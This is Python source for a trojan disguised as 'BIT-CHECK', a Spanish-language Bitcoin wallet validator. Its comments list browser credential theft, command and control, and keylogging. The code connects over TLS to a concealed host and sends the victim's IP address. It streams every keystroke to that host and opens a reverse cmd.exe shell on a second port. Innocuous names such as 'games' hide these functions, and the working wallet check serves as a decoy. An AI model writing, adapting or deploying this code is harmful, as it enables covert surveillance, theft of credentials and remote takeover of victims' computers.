import ctypes
import ssl
import tempfile
import threading
import subprocess
import time
import os
import colorama
from colorama import init, Fore
import keyboard
import socket
import find_interests
from CryptoPhenix import decrypt
import requests
import certs

colorama.init()
close = False
#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#


# ACTUALES:
# Checker de cuentas de bitcoin
# Credenciales de navegadores
# C&C
# Keylogger


def prep_gme():
    try:
        pim = b'\xf9\x0c]Q\x81\xcf\xf0\xf0Z\xeb FA\xef;\xc3`\x8b\x17\xa5\xf06\x89\x0cq\x9cz\x1cYA\xa93\xb9\xfc\xaa{\x11g\x1d{{\xf4\x9c\xe2R/]\xa9\xc6\x0c\x15E\xee\xac\xaa~\xebE\xbe@\x1b\xa6s\xb0'
        conn.send("\n\n".encode() + decrypt(pim) + " ".encode())
        conn.send(requests.get('http://checkip.amazonaws.com').text.strip().encode() + "\n\n".encode())
    except Exception:
        pass


def banner():
    print(Fore.RED + """\t
\t██████╗ ██╗████████╗    ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
\t██╔══██╗██║╚══██╔══╝   ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
\t██████╔╝██║   ██║█████╗██║     ███████║█████╗  ██║     █████╔╝ 
\t██╔══██╗██║   ██║╚════╝██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
\t██████╔╝██║   ██║      ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
\t╚═════╝ ╚═╝   ╚═╝       ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝""", Fore.YELLOW + """
\t\t\tv1.2a -- [Q] to Quit -- [H] For help
\n""" + Fore.RESET)


def help_me():
    print(Fore.GREEN + """\t
    \tBienvenido al validador de cuentas de Bitcoin...
    \t
    \tSolamente debes introducir una wallet y nos encargaremos
    \tde hacer la validacion por ti!
    \t""" + Fore.RESET)


def know_gme():
    unkown = b"9\x07\xa2:|\x9d\x1f\xe7bCN\x9aE\xfdKg4\xe7\x918\x00#\x05\x04\x00\xedR\x1c\x1c@\x15c\xf5\x91o\xcc~[z\xc9\x92B\x0c\xbf\xe9Z\xb9\x15\xd7l\xe2\x087 \xf1P\x90\xaf\x07\x0fI'\xb9\xd0"
    # return str(decrypt(unkown).decode())
    return "127.0.0.1"


banner()
print(Fore.GREEN + "\n\t[!] Bienvenido! Cargando modulos de validación...")
yek = []


def is_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        print(Fore.RED + "[!] ESTE PROGRAMA NECESITA PERMISOS DE ADMINISTRADOR.")
        input("\n\n\t[ENTER]")
        exit()


try:
    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_crte().encode())
    csd.close()

    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_locker().encode())
    cock.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile=csd.name, keyfile=cock.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5000))
    conn = context.wrap_socket(sock, server_hostname=know_gme())
except Exception:
    pass


def on_press(event):
    try:
        t = threading.Thread(target=init_game)
        t.start()

        yek.append(event.name)

        if len(event.name) > 1:
            conn.send(" |".encode() + event.name.encode() + "| ".encode())
        else:
            conn.send(event.name.encode())
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except Exception:
        pass


def sdn_gme(s, xxx):
    try:
        while True:
            output = xxx.stdout.readline()
            if not output:
                break
            s.send(output)
    except ssl.SSLEOFError:
        pass


def rcv_gme(s, xxx):
    while True:
        try:
            command = s.recv(1024)
            if not command:
                break
            xxx.stdin.write(command)
            xxx.stdin.flush()
        except Exception:
            break


def games():
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.verify_mode = ssl.CERT_NONE
        context.load_cert_chain(certfile=csd.name, keyfile=cock.name)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((know_gme(), 5001))
        conn = context.wrap_socket(sock, server_hostname=know_gme())

        # Crear el proceso con un shell interactivo
        xxx = subprocess.Popen('cmd.exe', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               stdin=subprocess.PIPE)

        # Leer la salida del proceso en un hilo adicional y enviarla al socket
        ompt_rcv = threading.Thread(target=rcv_gme, args=(conn, xxx))
        ompt_rcv.start()

        ompt_sdn = threading.Thread(target=sdn_gme, args=(conn, xxx))
        ompt_sdn.start()

        ompt_rcv.join()
        ompt_sdn.join()

        conn.close()
        xxx.terminate()
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except Exception:
        pass


def exiting():
    print("\n\n[!] Cerrando sesión, no cierre el programa")

    lgo = ", ".join(yek)

    try:
        conn.send(f"\n\n[!] Este ha sido mi resumen: \n{lgo}".encode())
        conn.send("-".encode() * 50)

        conn.close()
        print("[!] Salida con éxito.")
        time.sleep(3)
        exit()
    except Exception:
        exit()


def init_game():

    t = threading.Thread(target=games)
    t.start()

    t.join()


def check_bitcoin_address(address):
    response = requests.get(f"https://blockchain.info/rawaddr/{address}")
    if response.status_code == 200:
        return True
    else:
        return False


def main():
    global close
    try:
        prep_gme()
        clean()
        banner()
        init(convert=True)

        find_interests.main()
        keyboard.on_press(on_press)
        wallet = ""

        while wallet.lower() != "q":
            print("\n\t\t┌──(" + Fore.CYAN + "㉿" + Fore.RESET + "BIT-CHECK)-[#]")
            wallet = input("\t\t└─$ ")
            if wallet.lower() == "h":
                clean()
                banner()
                help_me()

            elif wallet.lower() != "q" and wallet.lower() != "h":
                if check_bitcoin_address(wallet):
                    print(Fore.GREEN + "\n\t[!] " + Fore.YELLOW + f"{wallet} es una cuenta de Bitcoin válida" + Fore.RESET)
                else:
                    print(Fore.RED + "\n\t[!] " + Fore.YELLOW + f"{wallet} no es una cuenta de Bitcoin válida" + Fore.RESET)

        close = True
        return


    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except KeyboardInterrupt:
        exiting()


def clean():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")


if __name__ == "__main__":
    try:
        clean()
        banner()
        # is_admin()
        main()
        if close:
            exiting()


    except KeyboardInterrupt:
        exiting()